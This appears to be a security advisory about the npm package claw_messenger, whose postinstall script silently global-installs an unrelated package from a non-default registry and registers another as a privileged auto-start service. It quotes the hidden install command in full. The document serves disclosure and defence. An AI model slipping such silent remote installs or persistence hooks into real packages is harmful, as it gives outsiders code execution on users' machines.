summary: Postinstall silently global-installs unrelated mutable package from non-default registry
details: On npm install, the package's postinstall script (dist/postinstall.js) spawns a detached, stdio-suppressed `npm install -g opencode-ai --registry=https://registry.npmmirror.com --prefer-offline --no-audit --no-fund --progress=false` with `shell:true`, `detached:true`, `stdio:'ignore'`, and `unref()`. opencode-ai is an unrelated third-party AI coding agent that is not mentioned in the README and has no relation to the messenger functionality this package advertises. The install is unpinned (`@latest`), routed through a non-default registry mirror, hidden from the user (no progress, no output), and runs its own postinstall lifecycle with the privileges of the npm install — which means whoever controls opencode-ai@latest on npmmirror at the moment of installation executes arbitrary code on every machine that installs claw_messenger. Separately, the postinstall also chain-installs `claw-subagent-service@latest` (also unpinned) and registers it as an auto-starting Windows service / systemd unit / launchd job via elevated PowerShell `RunAs`, giving any future compromise of that package persistent privileged execution on the installer's host. The combination of an undocumented unrelated dependency, mutable @latest tags, a third-party registry mirror, output suppression, and privileged service registration constitutes a hidden second-stage install vector.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
